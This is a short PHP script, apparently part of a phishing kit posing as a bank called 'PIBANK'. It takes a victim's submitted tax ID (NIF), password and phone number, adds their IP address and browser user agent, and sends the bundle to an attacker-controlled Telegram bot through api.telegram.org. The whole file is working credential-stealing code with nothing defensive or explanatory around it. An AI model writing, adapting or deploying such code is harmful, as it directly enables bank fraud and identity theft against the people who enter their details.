<?php
/**
###############################################
#$           N30 Private Code                $#
#$          Copyright 2020 CUSTOM            $#
###############################################
**/
include '../../config/config.php';

if($_POST['content'] == 'main'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "<pre>PIBANK Info\n";
$message .= "NIF          : ".$_POST['nif']."\n";
$message .= "Password        : ".$_POST['password']."\n";
$message .= "Teléfono         : ".$_POST['phone']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "</pre>";
$praga=rand();
$praga=md5($praga);

foreach ($chats_id as $chat_id) {
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . rawurlencode(($message))."&parse_mode=HTML" );
  }
}
